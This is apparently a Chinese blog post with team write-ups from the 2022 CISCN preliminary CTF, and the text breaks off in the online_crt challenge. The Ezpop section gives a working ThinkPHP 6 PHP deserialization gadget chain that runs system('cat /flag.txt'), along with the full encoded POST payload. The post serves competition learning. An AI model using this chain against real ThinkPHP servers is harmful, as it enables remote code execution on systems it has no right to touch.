@@ -1,0 +1,2058 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTF | 2022 CISCN 初赛 WriteUp, MiaoTony,blog">
+    <meta name="description" content="又是一年一度的国赛，今年知识问答和场景实操加起来持续10h，比去年轻松了不少，这篇来记录一下初赛的writeup。">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-159946730-1');
+</script>
+
+
+    <title>CTF | 2022 CISCN 初赛 WriteUp | MiaoTony&#39;s小窝</title>
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+	
+    <script src="/libs/jquery/jquery.min.js"></script>
+    <script>
+        //来个特效玩玩喵 20200123
+        var titleTime;
+        var OriginTitile = document.title;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '|ω·) 喵~快回来呀！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(/≧▽≦)/ Meow！';
+                titleTime = setTimeout(function() {
+        	    document.title = OriginTitile;
+        }, 800);
+    }
+        });
+    </script>
+<meta name="generator" content="Hexo 5.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">MiaoTony&#39;s小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">MiaoTony&#39;s小窝</div>
+        <div class="logo-desc">
+            
+            喵~欢迎各位大佬的来访呀！
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CTF | 2022 CISCN 初赛 WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        min-width: 240px;
+        padding-left: 15px;
+        padding-bottom: 30px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 30px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+	    max-height: 450px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/WriteUp/">
+                                <span class="chip bg-color">WriteUp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-05-31
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    5.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    26 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p><img src="/2022/05/31/CTF_2022CISCN_preliminary/image-20220603011922795.png"></p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
+<p><strong>第十五届全国大学生信息安全竞赛创新实践能力赛(CISCN 2022) - 线上初赛</strong></p>
+<p><a target="_blank" rel="noopener" href="http://www.ciscn.cn/">http://www.ciscn.cn</a></p>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/640.png"></p>
+<p>比赛地址： </p>
+<ul>
+<li><p>知识问答地址（5月28日10:00开放）：</p>
+<p><a target="_blank" rel="noopener" href="https://knowledge.ichunqiu.com/2022dxs">https://knowledge.ichunqiu.com/2022dxs</a></p>
+</li>
+<li><p>场景实操地址（5月28日10:00开放）：</p>
+<p><a target="_blank" rel="noopener" href="https://ctf.ichunqiu.com/2022dxs">https://ctf.ichunqiu.com/2022dxs</a></p>
+</li>
+</ul>
+</blockquote>
+<p>又是一年一度的国赛，今年比赛时间从 24h 修改成了 10h，属实比去年 CTF 高考轻松了不少（呜呜</p>
+<p>今年国赛也是一堆 ddl 的夹缝中度过，不过不是和 Asuri 一起打啦（润啦），今年就和现在的校队师傅们组了个 xdlddw 战队来摸鱼。</p>
+<p><em>（嗯，熊大佬带带我</em></p>
+<p>这篇大部分来自 xdlddw 战队的 writeup，喵喵主要看的是 Web 和 Misc<em>（以及非预期的 Crypto？）</em>，其他题目是队友做的，队友强强！</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><blockquote>
+<p>最近，小明在学习php开发，于是下载了thinkphp的最新版，但是却被告知最新版本存在漏洞，你能找到漏洞在哪里吗？</p>
+</blockquote>
+<p><code>www.zip</code> 源码泄露，<code>/www/app/controller/Index.php</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
+
+<span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token string single-quoted-string">'&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V'</span> <span class="token operator">.</span> <span class="token class-name class-name-fully-qualified static-context"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>facade<span class="token punctuation">\</span>App</span><span class="token operator">::</span><span class="token function">version</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br/&gt;&lt;span style="font-size:30px;"&gt;14载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;span style="font-size:25px;"&gt;[ V6.0 版本由 &lt;a href="https://www.yisu.com/" target="yisu"&gt;亿速云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;think id="ee9b1aa918103c4fc"&gt;&lt;/think&gt;'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ThinkPHP6'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token string single-quoted-string">'hello,'</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+   	<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    
+<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>test 路由下接收一个参数 <code>a</code>，进行反序列化。</p>
+<p>参考 <a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/321546.html">ThinkPHP6.0.12LTS反序列漏洞分析</a></p>
+<p>改一改 payload</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">{</span>
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>
+        <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span> <span class="token operator">=&gt;</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'cat /flag.txt'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span> <span class="token operator">=&gt;</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">{</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">namespace</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后打到 <code>/index.php/index/test</code> 路由下就行了</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> /index.php/index/test HTTP/1.1</span>
+<span class="token header-name keyword">Host:</span> eci-2ze4zrgge5xdi5zfbgbu.cloudeci1.ichunqiu.com
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
+<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
+<span class="token header-name keyword">Connection:</span> close
+<span class="token header-name keyword">Cookie:</span> __jsluid_h=8c268871dacd5c7b5c0add864501efde
+<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1
+<span class="token header-name keyword">Pragma:</span> no-cache
+<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded
+<span class="token header-name keyword">Cache-Control:</span> no-cache
+<span class="token header-name keyword">Content-Length:</span> 1251
+
+a=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22cat+%2Fflag.txt%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A7%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A13%3A%22cat+%2Fflag.txt%22%3B%7D%7Ds%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00table%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A6%3A%22whoami%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00json%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3Bi%3A1%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7D%7Ds%3A12%3A%22%00%2A%00jsonAssoc%22%3Bb%3A1%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/05/31/CTF_2022CISCN_preliminary/1.png"></p>
+<h3 id="online-crt"><a href="#online-crt" class="headerlink" title="online_crt"></a>online_crt</h3><blockquote>
+<p>快来生成一个自己的ssl证书吧~</p>
+<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ccHubsueb_cpsSnwJQ5CKg">附件下载</a> 提取码（GAME）<a target="_blank" rel="noopener" href="https://share.weiyun.com/oT91wKq8">备用下载</a></p>
+</blockquote>
+<p>给了源码，后端包括 python 和 golang</p>
+<p>先看这 Python 后端源码</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> datetime
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> socket
+<span class="token keyword">import</span> uuid
+<span class="token keyword">from</span> cryptography <span class="token keyword">import</span> x509
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives <span class="token keyword">import</span> hashes<span class="token punctuation">,</span> serialization
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>primitives<span class="token punctuation">.</span>asymmetric <span class="token keyword">import</span> rsa
+<span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>x509<span class="token punctuation">.</span>oid <span class="token keyword">import</span> NameOID
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get_crt</span><span class="token punctuation">(</span>Country<span class="token punctuation">,</span> Province<span class="token punctuation">,</span> City<span class="token punctuation">,</span> OrganizationalName<span class="token punctuation">,</span> CommonName<span class="token punctuation">,</span> EmailAddress<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    root_key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>generate_private_key<span class="token punctuation">(</span>
+        public_exponent<span class="token operator">=</span><span class="token number">65537</span><span class="token punctuation">,</span>
+        key_size<span class="token operator">=</span><span class="token number">2048</span><span class="token punctuation">,</span>
+        backend<span class="token operator">=</span>default_backend<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span>
